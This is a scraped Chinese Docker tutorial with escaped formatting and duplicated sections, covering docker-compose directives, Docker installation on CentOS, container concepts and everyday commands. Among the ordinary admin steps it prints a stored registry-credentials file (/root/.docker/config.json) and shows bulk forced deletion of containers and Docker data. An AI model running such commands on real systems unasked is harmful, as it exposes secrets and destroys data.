\t\t\t\t\t\t\t//前台启动一组服务\n[root@centos ~]# docker-compose up -d \t\t\t\t\t\t\t//后台启动一组服务\n\n\n1\n2\n\n\n----------------------------------------\n\n\n# docker-compose 模板文件\n\n模板文件是使用 Compose 的核心，涉及到的指令关键字也比较多。但大家不用担心，这里面大部分指令跟 docker run 相关参数的含义都是类似的。\n\n默认的模板文件名称为 docker-compose.yml，格式为 YAML 格式。\n\nversion: "3"\n\nservices:\n  webapp:\n    image: examples/web\n    ports:\n      - "80:80"\n    volumes:\n      - "/data"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n注意每个服务都必须通过 image 指令指定镜像或 build 指令（需要 Dockerfile）等来自动构建生成镜像。\n\n如果使用 build 指令，在 Dockerfile 中设置的选项(例如：CMD, EXPOSE, VOLUME, ENV 等) 将会自动被获取，无需在 docker-compose.yml 中重复设置。\n\n下面分别介绍各个指令的用法。\n\n# build\n\n指定 Dockerfile 所在文件夹的路径（可以是绝对路径，或者相对 docker-compose.yml 文件的路径）。 Compose 将会利用它自动构建这个镜像，然后使用这个镜像。\n\nversion: \'3\'\nservices:\n\n  webapp:\n    build: ./dir\n\n\n1\n2\n3\n4\n5\n\n\n你也可以使用 context 指令指定 Dockerfile 所在文件夹的路径。\n\n使用 dockerfile 指令指定 Dockerfile 文件名。\n\n使用 arg 指令指定构建镜像时的变量。\n\nversion: \'3\'\nservices:\n\n  webapp:\n    build:\n      context: ./dir\n      dockerfile: Dockerfile-alternate\n      args:\n        buildno: 1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# command\n\n覆盖容器启动后默认执行的命令。\n\ncommand: echo "hello world"\n\n\n1\n\n\n# container_name\n\n指定容器名称。默认将会使用 项目名称_服务名称_序号 这样的格式。\n\ncontainer_name: docker-web-container\n\n\n1\n\n\n> 注意: 指定容器名称后，该服务将无法进行扩展（scale），因为 Docker 不允许多个容器具有相同的名称。\n\n# depends_on\n\n解决容器的依赖、启动先后的问题。以下例子中会先启动 redis db 再启动 web\n\nversion: \'3\'\n\nservices:\n  web:\n    build: .\n    depends_on:\n      - db\n      - redis\n\n  redis:\n    image: redis\n\n  db:\n    image: postgres\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n> 注意：web 服务不会等待 redis db 「完全启动」之后才启动。\n\n# env_file\n\n从文件中获取环境变量，可以为单独的文件路径或列表。\n\n如果通过 docker-compose -f FILE 方式来指定 Compose 模板文件，则 env_file 中变量的路径会基于模板文件路径。\n\n如果有变量名称与 environment 指令冲突，则按照惯例，以后者为准。\n\nenv_file: .env\n\nenv_file:\n  - ./common.env\n  - ./apps/web.env\n  - /opt/secrets.env\n\n\n1\n2\n3\n4\n5\n6\n\n\n环境变量文件中每一行必须符合格式，支持 # 开头的注释行。\n\n# common.env: Set development environment\nPROG_ENV=development\n\n\n1\n2\n\n\n# environment\n\n设置环境变量。你可以使用数组或字典两种格式。\n\n只给定名称的变量会自动获取运行 Compose 主机上对应变量的值，可以用来防止泄露不必要的数据。\n\nenvironment:\n  RACK_ENV: development\n  SESSION_SECRET:\n\nenvironment:\n  - RACK_ENV=development\n  - SESSION_SECRET\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n如果变量名称或者值中用到 true|false，yes|no 等表达 布尔 含义的词汇，最好放到引号里，避免 YAML 自动解析某些内容为对应的布尔语义。这些特定词汇，包括\n\ny|Y|yes|Yes|YES|n|N|no|No|NO|true|True|TRUE|false|False|FALSE|on|On|ON|off|Off|OFF\n\n\n1\n\n\n# healthcheck\n\n通过命令检查容器是否健康运行。\n\nhealthcheck:\n  test: ["CMD", "curl", "-f", "http://localhost"]\n  interval: 1m30s\n  timeout: 10s\n  retries: 3\n\n\n1\n2\n3\n4\n5\n\n\n# image\n\n指定为镜像名称或镜像 ID。如果镜像在本地不存在，Compose 将会尝试拉取这个镜像。\n\nimage: ubuntu\nimage: orchardup/postgresql\nimage: a4bc65fd\n\n\n1\n2\n3\n\n\n# networks\n\n配置容器连接的网络。\n\nversion: "3"\nservices:\n\n  some-service:\n    networks:\n     - some-network\n     - other-network\n\nnetworks:\n  some-network:\n  other-network:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n# ports\n\n暴露端口信息。\n\n使用宿主端口：容器端口 (HOST:CONTAINER) 格式，或者仅仅指定容器的端口（宿主将会随机选择端口）都可以。\n\nports:\n - "3000"\n - "8000:8000"\n - "49100:22"\n - "127.0.0.1:8001:8001"\n\n\n1\n2\n3\n4\n5\n\n\n注意：当使用 HOST:CONTAINER 格式来映射端口时，如果你使用的容器端口小于 60 并且没放到引号里，可能会得到错误结果，因为 YAML 会自动解析 xx:yy 这种数字格式为 60 进制。为避免出现这种问题，建议数字串都采用引号包括起来的字符串格式。\n\n# sysctls\n\n配置容器内核参数。\n\nsysctls:\n  net.core.somaxconn: 1024\n  net.ipv4.tcp_syncookies: 0\n\nsysctls:\n  - net.core.somaxconn=1024\n  - net.ipv4.tcp_syncookies=0\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# ulimits\n\n指定容器的 ulimits 限制值。\n\n例如，指定最大进程数为 65535，指定文件句柄数为 20000（软限制，应用可以随时修改，不能超过硬限制） 和 40000（系统硬限制，只能 root 用户提高）。\n\n  ulimits:\n    nproc: 65535\n    nofile:\n      soft: 20000\n      hard: 40000\n\n\n1\n2\n3\n4\n5\n\n\n# volumes\n\n数据卷所挂载路径设置。可以设置为宿主机路径(HOST:CONTAINER)或者数据卷名称(VOLUME:CONTAINER)，并且可以设置访问模式 （HOST:CONTAINER:ro）。\n\n该指令中路径支持相对路径。\n\nvolumes:\n - /var/lib/mysql\n - cache/:/tmp/cache\n - ~/configs:/etc/configs/:ro\n\n\n1\n2\n3\n4\n\n\n如果路径为数据卷名称，必须在文件中配置数据卷。\n\nversion: "3"\n\nservices:\n  my_src:\n    image: mysql:8.0\n    volumes:\n      - mysql_data:/var/lib/mysql\n\nvolumes:\n  mysql_data:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n----------------------------------------\n\n\n# docker-compose 常用命令\n\n# 1. 命令对象与格式\n\n对于 Compose 来说，大部分命令的对象既可以是项目本身，也可以指定为项目中的服务或者容器。如果没有特别的说明，命令对象将是项目，这意味着项目中所有的服务都会受到命令影响。\n\n执行 docker-compose [COMMAND] --help 或者 docker-compose help [COMMAND] 可以查看具体某个命令的使用格式。\n\ndocker-compose 命令的基本的使用格式是\n\ndocker-compose [-f=<arg>...] [options] [COMMAND] [ARGS...]\n\n\n1\n\n\n# 2. 命令选项\n\n * -f, --file FILE 指定使用的 Compose 模板文件，默认为 docker-compose.yml，可以多次指定。\n * -p, --project-name NAME 指定项目名称，默认将使用所在目录名称作为项目名。\n * --x-networking 使用 Docker 的可拔插网络后端特性\n * --x-network-driver DRIVER 指定网络后端的驱动，默认为 bridge\n * --verbose 输出更多调试信息。\n * -v, --version 打印版本并退出。\n\n# 3.命令使用说明\n\n# up\n\n格式为 docker-compose up [options] [SERVICE...]。\n\n * 该命令十分强大，它将尝试自动完成包括构建镜像，（重新）创建服务，启动服务，并关联服务相关容器的一系列操作。\n\n * 链接的服务都将会被自动启动，除非已经处于运行状态。\n\n * 可以说，大部分时候都可以直接通过该命令来启动一个项目。\n\n * 默认情况，docker-compose up 启动的容器都在前台，控制台将会同时打印所有容器的输出信息，可以很方便进行调试。\n\n * 当通过 Ctrl-C 停止命令时，所有容器将会停止。\n\n * 如果使用 docker-compose up -d，将会在后台启动并运行所有的容器。一般推荐生产环境下使用该选项。\n\n * 默认情况，如果服务容器已经存在，docker-compose up 将会尝试停止容器，然后重新创建（保持使用 volumes-from 挂载的卷），以保证新启动的服务匹配 docker-compose.yml 文件的最新内容\n\n----------------------------------------\n\n# down\n\n * 此命令将会停止 up 命令所启动的容器，并移除网络\n\n----------------------------------------\n\n# exec\n\n * 进入指定的容器。\n\n----------------------------------------\n\n# ps\n\n格式为 docker-compose ps [options] [SERVICE...]。\n\n列出项目中目前的所有容器。\n\n选项：\n\n * -q 只打印容器的 ID 信息。\n\n----------------------------------------\n\n# restart\n\n格式为 docker-compose restart [options] [SERVICE...]。\n\n重启项目中的服务。\n\n选项：\n\n * -t, --timeout TIMEOUT 指定重启前停止容器的超时（默认为 10 秒）。\n\n----------------------------------------\n\n# rm\n\n格式为 docker-compose rm [options] [SERVICE...]。\n\n删除所有（停止状态的）服务容器。推荐先执行 docker-compose stop 命令来停止容器。\n\n选项：\n\n * -f, --force 强制直接删除，包括非停止状态的容器。一般尽量不要使用该选项。\n * -v 删除容器所挂载的数据卷。\n\n----------------------------------------\n\n# start\n\n格式为 docker-compose start [SERVICE...]。\n\n启动已经存在的服务容器。\n\n----------------------------------------\n\n# stop\n\n格式为 docker-compose stop [options] [SERVICE...]。\n\n停止已经处于运行状态的容器，但不删除它。通过 docker-compose start 可以再次启动这些容器。\n\n选项：\n\n * -t, --timeout TIMEOUT 停止容器时候的超时（默认为 10 秒）。\n\n----------------------------------------\n\n# top\n\n查看各个服务容器内运行的进程。\n\n----------------------------------------\n\n# unpause\n\n格式为 docker-compose unpause [SERVICE...]。\n\n恢复处于暂停状态中的服务。\n\n----------------------------------------\n\n\n# docker可视化工具\n\n# 安装Portainer\n\n官方安装说明：https://www.portainer.io/installation/\n\n[root@ubuntu1804 ~]#docker pull  portainer/portainer\n\n[root@ubuntu1804 ~]#docker volume create portainer_data\nportainer_data\n[root@ubuntu1804 ~]#docker run -d -p 8000:8000 -p 9000:9000 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer\n20db26b67b791648c2ef6aee444a5226a9c897ebcf0160050e722dbf4a4906e3\n[root@ubuntu1804 ~]#docker ps \nCONTAINER ID        IMAGE                 COMMAND             CREATED             STATUS              PORTS                                            NAMES\n20db26b67b79        portainer/portainer   "/portainer"        5 seconds ago       Up 4 seconds        0.0.0.0:8000->8000/tcp, 0.0.0.0:9000->9000/tcp   portainer\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# 登录和使用Portainer\n\n> 用浏览器访问：http://localhost:9000\n\n',normalizedContent:'# docker\n\n\n# docker 理念\n\n> docker的主要目标是“build，ship and run any app,anywhere”，也就是通过对应用组件的封装、分发、部署、运行等生命周期的管理，使用户的app（可以是一个web应用或数据库应用等等）及其运行环境能够做到“一次封装，到处运行”。解决了运行环境和配置问题软件容器，方便做持续集成并有助于整体发布的容器虚拟化技术。\n\n\n\n\n# linux容器的实现方式\n\n> 一个正在运行的 docker 容器，其实就是一个启用了多个 linux namespace 的应用进程，而这个进程能够使用的资源量，则受 cgroups 配置的限制。这也是容器技术中一个非常重要的概念，即：容器是一个“单进程”模型。\n\n一个“容器”，实际上是一个由 linux namespace、linux cgroups 和 rootfs 三种技术构建出来的进程的隔离环境。\n\n 1. namespace 的作用是“隔离”，它让应用进程只能看到该 namespace 内的“世界”；修改进程视图的主要方法\n\n 2. cgroups 的作用是“限制”，它给这个“世界”围上了一圈看不见的墙。制造约束的主要手段\n\n 3. 一组联合挂载在 /var/lib/docker/aufs/mnt 上的 rootfs，这一部分我们称为“容器镜像”（container image），是容器的静态视图；一个由 namespace+cgroups 构成的隔离环境，这一部分我们称为“容器运行时”（container runtime），是容器的动态视图。\n\n\n# namespace\n\n在容器中看到只有自己一个进程，但是这个进程其实是在宿主机上的 只不过是一个独立的namespace\n\n定义了5个命名空间结构体，多个进程可以使用同一个namespace\n\n 1. uts： 运行内核的名称、版本、底层体系结构类型等信息（unix timesharing system）\n\n 2. ipc： 与进程间通信（ipc)有关\n\n 3. mnt：已经装载的文件系统的视图 mount namespace，用于让被隔离进程只看到当前 namespace 里的挂载点信息；\n\n 4. pid：有关进程id的信息\n\n 5. net：网络相关的命名空间参数 network namespace，用于让被隔离进程看到当前 namespace 里的网络设备和配置。\n\n在 linux 内核中，有很多资源和对象是不能被 namespace 化的，最典型的例子就是：时间。\n\n为了让多个容器以沙盒的方式在宿主机上运行，就需要提前定义好各个容器能看到的边界。由于各个容器都是直接运行在宿主机系统上，因此需要内核对各个容器的上下文进行修改，让他们看上去是一个独立的操作系统。比如，指定pid为1的进程，指定网卡设备，指定文件系统挂载，指定用户等等。\n\nlinux操作系统内核从底层实现了为各个进程创建独立用户空间的功能，不同用户空间似于一个个独立的虚拟机系统，用户空间内部进程不能感知到其它用户空间中的进程状态。内核提供了六种namespaces。\n\nuts     hostname and domainname    主机名和域名隔离                内核版本：2.6.19\nuser                               用户隔离。运行进程的用户和组          内核版本：3.8.x\nmount                              挂载点隔离。即挂载点隔离，主要指根目录     内核版本：2.4.19\nipc     inter-process-connection   进程间通信隔离。消息队列、共享内容、信号量   内核版本：2.6.19\npid     process                                            \nid                                 pid隔离                   \nnet     network                    网络隔离。网络设备、协议栈、端口        内核版本：2.6.29\n\n\n# cgroups\n\nlinux cgroups 就是 linux 内核中用来为进程设置资源限制的一个重要功能。\n\nlinux cgroups 的全称是 linux control group。它最主要的作用，就是限制一个进程组能够使用的资源上限，包括 cpu、内存、磁盘、网络带宽等等。\n\n此外，cgroups 还能够对进程进行优先级设置、审计，以及将进程挂起和恢复等操作。\n\n\n# chroot\n\n如果需要在一个宿主机上运行多个容器，且容器之间相互隔离，那么第一个就需要系统库文件的依赖，对于一个容器而言，需要将其需要的系统文件单独复制出来一份，放到指定目录，并且需要让进程认为这就是根目录，而不是去调用宿主机系统上的库文件。chroot就是一个切换根目录的方式。\n\n\n# docker和虚拟机的区别\n\n比较了 docker 和传统虚拟化方式的不同之处：\n\n * 传统虚拟机技术是虚拟出一套硬件后，在其上运行一个完整操作系统，在该系统上再运行所需应用进程；\n\n * 而容器内的应用进程直接运行于宿主的内核，容器内没有自己的内核， 而且也没有进行硬件虚拟。因此容器要比传统虚拟机更为轻便。\n\n * 每个容器之间互相隔离，每个容器有自己的文件系统 ，容器之间进程不会相互影响，能区分计算资源。\n\n\n# 虚拟机\n\n它可以在一种操作系统里面运行另一种操作系统，比如在windows 系统里面运行linux 系统。应用程序对此毫无感知，因为虚拟机看上去跟真实系统一模一样，而对于底层系统来说，虚拟机就是一个普通文件，不需要了就删掉，对其他部分毫无影响。这类虚拟机完美的运行了另一套系统，能够使应用程序，操作系统和硬件三者之间的逻辑不变。\n\n虚拟机的缺点：\n\n * 资源占用多\n * 冗余步骤多\n * 启动慢\n\n\n\n\n# docker\n\nlinux 容器不是模拟一个完整的操作系统，而是对进程进行隔离。有了容器，就可以将软件运行所需的所有资源打包到一个隔离的容器中。容器与虚拟机不同，不需要捆绑一整套操作系统，只需要软件工作所需的库资源和设置。系统因此而变得高效轻量并保证部署在任何环境中的软件都能始终如一地运行。\n\n\n\n\n# docker的优势\n\ndocker是一个client-server结构的系统，docker守护进程运行在主机上， 然后通过socket连接从客户端访问，守护进程从客户端接受命令并管理运行在主机上的容器。 容器，是一个运行时环境，就是我们前面说到的集装箱。docker有着比虚拟机更少的抽象层。由亍docker不需要hypervisor实现硬件资源虚拟化,运行在docker容器上的程序直接使用的都是实际物理机的硬件资源。因此在cpu、内存利用率上docker将会在效率上有明显优势。docker利用的是宿主机的内核,而不需要guest os。因此,当新建一个容器时,docker不需要和虚拟机一样重新加载一个操作系统内核。仍而避免引寻、加载操作系统内核返个比较费时费资源的过程,当新建一个虚拟机时,虚拟机软件需要加载guest os,返个新建过程是分钟级别的。而docker由于直接利用宿主机的操作系统,则省略了返个过程,因此新建一个docker容器只需要几秒钟。\n\n\n\n\n# 相关概念\n\n需要正确的理解仓储/镜像/容器这几个概念:\n\ndocker 本身是一个容器运行载体或称之为管理引擎。我们把应用程序和配置依赖打包好形成一个可交付的运行环境，这个打包好的运行环境就似乎 image镜像文件。只有通过这个镜像文件才能生成 docker 容器。image 文件可以看作是容器的模板。docker 根据 image 文件生成容器的实例。同一个 image 文件，可以生成多个同时运行的容器实例。\n\n * image 文件生成的容器实例，本身也是一个文件，称为镜像文件。\n * 一个容器运行一种服务，当我们需要的时候，就可以通过docker客户端创建一个对应的运行实例，也就是我们的容器\n * 至于仓储，就是放了一堆镜像的地方，我们可以把镜像发布到仓储中，需要的时候从仓储中拉下来就可以了。\n\n\n\n\n# 镜像\n\ndocker 镜像（image）就是一个只读的模板。镜像可以用来创建 docker 容器，一个镜像可以创建很多容器。\n\ndocker镜像的命名标准：\n\n${registry_ name}/${repository. name}/${image. name}:${tag. name}\ndocker.io/library/alpine:3.10.1\n\n\n1\n2\n\n\n\n# 容器\n\ndocker 利用容器（container）独立运行的一个或一组应用。容器是用镜像创建的运行实例。\n\n它可以被启动、开始、停止、删除。每个容器都是相互隔离的、保证安全的平台。 可以把容器看做是一个简易版的 linux 环境（包括root用户权限、进程空间、用户空间和网络空间等）和运行在其中的应用程序。\n\n容器的定义和镜像几乎一模一样，也是一堆层的统一视角，唯一区别在于容器的最上面那一层是可读可写的。\n\n\n# 仓库\n\n仓库（repository）是集中存放镜像文件的场所。\n\n仓库(repository)和仓库注册服务器（registry）是有区别的。仓库注册服务器上往往存放着多个仓库，每个仓库中又包含了多个镜像，每个镜像有不同的标签（tag）。\n\n仓库分为公开仓库（public）和私有仓库（private）两种形式。\n\n最大的公开仓库是 docker hub，存放了数量庞大的镜像供用户下载。国内的公开仓库包括阿里云 、网易云等。\n\n\n# centos安装docker\n\n\n# 1. 卸载旧版本docker\n\nsudo yum remove docker \\\n                  docker-client \\\n                  docker-client-latest \\\n                  docker-common \\\n                  docker-latest \\\n                  docker-latest-logrotate \\\n                  docker-logrotate \\\n                  docker-engine\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 2. 设置镜像仓库\n\nsudo yum install -y yum-utils\nsudo yum-config-manager \\\n    --add-repo \\\n    https://download.docker.com/linux/centos/docker-ce.repo\n\n\n1\n2\n3\n4\n\n\n\n# 3. 安装docker\n\n sudo yum install docker-ce docker-ce-cli containerd.io docker-compose-plugin\n\n\n1\n\n\n\n# 4. 配置镜像加速\n\nsudo mkdir -p /etc/docker\nsudo tee /etc/docker/daemon.json <<-\'eof\'\n{\n  "registry-mirrors": ["https://t9rco7kp.mirror.aliyuncs.com"]\n}\neof\nsudo systemctl daemon-reload\n\n# 其他配置\n\n# daemon.json 配置介绍\n{\n  "graph": "/data/docker",\n  "storage-driver": "overlay2",\n  "insecure-registries": ["registry.access.redhat.com","quay.io"],\n  "registry-mirrors": ["https://q2gr04ke.mirror.aliyuncs.com>"],\n  "bip": "172.24.38.1/24",\n  "exec-opts": ["native.cgroupdriver=systemd"],\n  "live-restore": true\n}\n\n# 配置项注意点：\n# graph: 该关键字未来将被弃用，可以采用 "data-root" 替代\n# storage-driver: 存储驱动，即分层文件系统\n# insecure-registries: 不安全的docker registries，即使用http协议推拉镜象\n# registry-mirrors: 加速站点，一般可以使用阿里、网易云、docker中国(<https://registry.docker-cn.com>)的地址\n# bip: 指定docker bridge地址(不能以.0结尾)，生产中建议采用 172.xx.yy.1/24,其中xx.yy为宿主机ip后四位，方便定位问题\n# 若启动失败，查看 /var/log/message 日志排错\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# 5. 启动docker并测试\n\nsudo systemctl restart docker\ndocker run hello-world\n\n\n1\n2\n\n\n\n# 6. docker run逻辑图\n\n\n\n\n# 99. 卸载方式\n\nsystemctl stop docker \nyum -y remove docker-ce\nrm -rf /var/lib/docker\n\n\n1\n2\n3\n\n\n\n# docker 常用命令\n\n\n\n\n# 帮助相关\n\n# 查看版本\n\ndocker version\n\n\n1\n\n\n\n\n# 查看docker信息\n\ndocker info\n\n\n1\n\n\n\n\n# 查看帮助\n\ndocker --help\n\n\n1\n\n\n\n# 镜像相关命令\n\n# 1.查看本机中所有镜像\ndocker images\t--------------------------\t列出本地所有镜像\n-a\t\t\t列出所有镜像（包含中间映像层）\n-q\t\t\t只显示镜像id\n\n# 2.搜索镜像\ndocker search [options] 镜像名\t-------------------\t去dockerhub上查询当前镜像\n-s 指定值\t\t列出收藏数不少于指定值的镜像\n--no-trunc\t  显示完整的镜像信息\n\n# 3.从仓库下载镜像\ndocker pull 镜像名[:tag|@digest]\t----------------- 下载镜像\n\n# 4.删除镜像\ndocker rmi 镜像名\t--------------------------  删除镜像\n-f\t\t强制删除\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# 登录退出dockerhub\n\ndocker login docker.io\ncat /root/.docker/config.json\n\n\n1\n2\n\n\n\n\n# 列举系统上的镜像\n\ndocker images\noptions：\n\t-a   显示本机所有镜像\n\t-q   只显示id\n\t--digest  只显示摘要信息\n\t--no-trunc 显示完整镜像信息\n\n\n1\n2\n3\n4\n5\n6\n\n\n# 查找镜像\n\ndocker search xxx\noptions:\n\t--no-strunc 显示完整的镜像信息\n\n\n1\n2\n3\n\n\n# 拉取镜像\n\ndocker pull xxx[:版本]\n\n\n1\n\n\n# 删除镜像\n\ndocker rmi xxx\n\neg.\ndocker rmi centos 删除一个镜像\ndocker rmi centos:latest centos:7.1 删除多个\ndocker rmi $(docker images -aq) 删除全部\ndocker rmi -f xxx 强制删除\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 镜像标签\n\ndocker tag d4ff818577bc docker.io/zhangsan404/alpine:latest\n\n\n1\n\n\n\n\n# 推送镜像到远端\n\ndocker push docker.io/zhangsan404/alpine:latest\n\n\n1\n\n\n# 保存镜像到本地\n\ndocker save zhangsan404/alpine:test > alpine_test.tar\n\n\n1\n\n\n\n\n# 本地镜像导入\n\ndocker load < alpine_test.tar\n\n\n1\n\n\n\n\n\n# 容器相关命令\n\n# 1.运行容器\ndocker run 镜像名\t--------------------------\t镜像名新建并启动容器\n--name \t\t\t\t\t别名为容器起一个名字\n-d\t\t\t\t\t\t\t启动守护式容器（在后台启动容器）\n-p \t\t\t\t\t\t\t映射端口号：原始端口号\t\t 指定端口号启动\n\n例：docker run -it --name mytomcat -p 8888:8080 tomcat\ndocker run -d --name mytomcat -p tomcat\n\n# 2.查看运行的容器\ndocker ps\t\t\t\t\t--------------------------\t列出所有正在运行的容器\n-a\t\t\t正在运行的和历史运行过的容器\n-q\t\t\t静默模式，只显示容器编号\n\n# 3.停止|关闭|重启容器\ndocker start   容器名字或者容器id  --------------- 开启容器\ndocker restart 容器名或者容器id    --------------- 重启容器\ndocker stop  容器名或者容器id \t    ------------------ 正常停止容器运行\ndocker kill  容器名或者容器id      ------------------ 立即停止容器运行\n\n# 4.删除容器\ndocker rm -f 容器id和容器名     \ndocker rm -f $(docker ps -aq)\t\t--------------------------\t删除所有容器\n\n# 5.查看容器内进程\ndocker top 容器id或者容器名 ------------------ 查看容器内的进程\n\n# 6.查看查看容器内部细节\ndocker inspect 容器id \t\t------------------ 查看容器内部细节\n\n# 7.查看容器的运行日志\ndocker logs [options] 容器id或容器名\t------------------ 查看容器日志\n-t\t\t\t 加入时间戳\n-f\t\t\t 跟随最新的日志打印\n--tail \t 数字\t显示最后多少条\n\n# 8.进入容器内部\ndocker exec [options] 容器id 容器内命令 ------------------ 进入容器执行命令\n-i\t\t以交互模式运行容器，通常与-t一起使用\n-t\t\t分配一个伪终端    shell窗口   bash \n\n# 9.容器和宿主机之间复制文件\ndocker cp 文件|目录 容器id:容器路径           -----------------   将宿主机复制到容器内部\ndocker cp 容器id:容器内资源路径 宿主机目录路径  -----------------   将容器内资源拷贝到主机上\n\n# 10.数据卷(volum)实现与宿主机共享目录\ndocker run -v 宿主机的路径|任意别名:/容器内的路径 镜像名\n注意: \n1.如果是宿主机路径必须是绝对路径,宿主机目录会覆盖容器内目录内容\n2.如果是别名则会在docker运行容器时自动在宿主机中创建一个目录,并将容器目录文件复制到宿主机中\n\n# 11.打包镜像\ndocker save 镜像名 -o  名称.tar\n\n# 12.载入镜像\ndocker load -i   名称.tar\n\n# 13.容器打包成新的镜像\ndocker commit -m "描述信息" -a "作者信息"   （容器id或者名称）打包的镜像名称:标签\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n\n\n# 新建并运行容器\n\ndocker run [options] image [command] [arg...]\noptions：\n--name="容器新名字": 为容器指定一个名称；\n-d: 后台运行容器，并返回容器id，也即启动守护式容器；\n-i：以交互模式运行容器，通常与 -t 同时使用；\n-t：为容器重新分配一个伪输入终端，通常与 -i 同时使用；\n-p: 随机端口映射；\n-p: 指定端口映射，有以下四种格式\n      ip:hostport:containerport\n      ip::containerport\n      **hostport:containerport**\n      containerport\n\ne.g.\ndocker run --name centos_demo01 -t -i centos  # 交互式方式运行\ndocker run -d --name tomcat_demo01 -p 8081:8080 tomcat # 后台运行\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# 查看容器\n\ndocker ps [options]\n\noptions:\n\t-a    查看所有容器包括正在运行和停止的\n\t-q    显示id\n  -n    显示最近创建的n个容器\n\t-l    显示最近创建的容器\n\t--no-stunc    不截断输出\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# 退出容器的两种方式\n\nexit  # 容器停止\nctrl+p+q\n\n\n1\n2\n\n\n# 容器的启动、停止、重启、强制关闭\n\ndocker start xxx \ndocker stop xxx\ndocker restart xxx\ndocker kill xxx\n\n\n1\n2\n3\n4\n\n\n# 删除容器\n\ndocker rm -f $(docker ps -aq) # 强制删除全部容器               = docker ps -qa |xargs docker rm -f\n\n\n1\n\n\n# 查看容器日志\n\ndocker logs [options] 容器id\noptions：\n\t-t 时间戳\n\t-f 跟随最新日志\n\t--tail 数字后显示多少条\n\n\n1\n2\n3\n4\n5\n\n\n# 查看容器内进程\n\ndocker top 容器id\n\n\n1\n\n\n# 查看容器内部细节\n\ndocker inspect 容器id\n\n\n1\n\n\n# 重新进入正在运行的容器\n\ndocker exec -it 容器id /bin/bash  # 打开新的终端   新进程 以这种方式进入exit不会结束容器的运行\ndocker attach 容器id   # 直接进入容器启动的命令行终端\n\n\n1\n2\n\n\n# 文件相互拷贝\n\ndocker cp 容器id:容器路径 本机路径\ndocker cp 本机路径 容器id:容器内路径\n\n\n1\n2\n\n\n# 将容器保存为镜像\n\ndocker commit -p 容器名称 docker.io/zhangsan404/alpine:test_01\n\n\n1\n\n\n\n# 镜像\n\n\n# unionfs - 联合文件系统\n\n> unionfs（联合文件系统）：union文件系统（unionfs）是一种分层、轻量级并且高性能的文件系统，它支持对文件系统的修改作为一次提交来一层层的叠加，同时可以将不同目录挂载到同一个虚拟文件系统下(unite several directories into a single virtual filesystem)。union 文件系统是 docker 镜像的基础。镜像可以通过分层来进行继承，基于基础镜像（没有父镜像），可以制作各种具体的应用镜像。\n\n\n# docker镜像加载原理\n\ndocker的镜像实际上由一层一层的文件系统组成，这种层级的文件系统unionfs。\n\nbootfs(boot file system)主要包含bootloader和kernel, bootloader主要是引导加载kernel, linux刚启动时会加载bootfs文件系统，在docker镜像的最底层是bootfs。这一层与我们典型的linux/unix系统是一样的，包含boot加载器和内核。当boot加载完成之后整个内核就都在内存中了，此时内存的使用权已由bootfs转交给内核，此时系统也会卸载bootfs。\n\nrootfs (root file system) ，在bootfs之上。包含的就是典型 linux 系统中的 /dev, /proc, /bin, /etc 等标准目录和文件。rootfs就是各种不同的操作系统发行版，比如ubuntu，centos等等。\n\n\n\n\n# docker commit\n\n> docker commit 可以将一个容器打包为镜像。\n\ndocker commit -m="描述信息" -a="作者" 容器id 镜像名称:tag\n\ne.g.\ndocker commit -m="tomcat with demo/helloworld" -a="jm" 0179893d97e7 jm/tomcat:1.2\n\n\n1\n2\n3\n4\n\n\n\n\n\n# 容器数据卷\n\n> docker容器产生的数据，如果不通过docker commit生成新的镜像，使得数据做为镜像的一部分保存下来，那么当容器删除后，数据自然也就没有了。 为了能保存数据在docker中我们使用容器数据卷。\n\n卷就是目录或文件，存在于一个或多个容器中，由docker挂载到容器，但不属于联合文件系统，因此能够绕过union file system提供一些用于持续存储或共享数据的特性。\n\n卷的设计目的就是数据的持久化，完全独立于容器的生存周期，因此docker不会在容器删除时删除其挂载的数据卷\n\n特点：\n\n1：数据卷可在容器之间共享或重用数据 2：卷中的更改可以直接生效 3：数据卷中的更改不会包含在镜像的更新中 4：数据卷的生命周期一直持续到没有容器使用它为止\n\n\n# 命令行创建容器数据卷\n\n# 创建容器卷\n\n\tdocker run -ti --name demo01 -v ~/myfile:/opt:ro centos:latest # 带权限\n\n\n1\n\n\n# 查看容器卷挂载情况\n\ndocker inspect demo01  # 查看容器详细信息\n\n\n1\n\n\n\n\n\n# dockerfile创建容器数据卷\n\n 1. 创建一个文件夹\n\nmkdir mydockerfile\n\n\n1\n\n 2. 创建dockerfile文件\n\nvim dockerfile\n\nfrom centos   # 导入centos镜像\nvolume ["/datavolumecontainer1","/datavolumecontainer2"]  # 创建两个容器数据卷，由于主机的文件夹无法指定，这里的容器数据卷只有docker方向的\ncmd echo "finished,--------success1"\ncmd /bin/bash  # 执行bash\n\n\n1\n2\n3\n4\n5\n6\n\n 3. 构建容器\n\ndocker build -f dockerfile位置 -t 输出的镜像名称 . # 当前目录\n\ne.g.\ndocker build -f ~/mydockerfile/dockerfile -t jm/centos_jm:1.1 .\n\n\n1\n2\n3\n4\n\n\n\n\n默认主机端数据卷对接位置：\n\n\n\n\n# 数据卷容器\n\n> 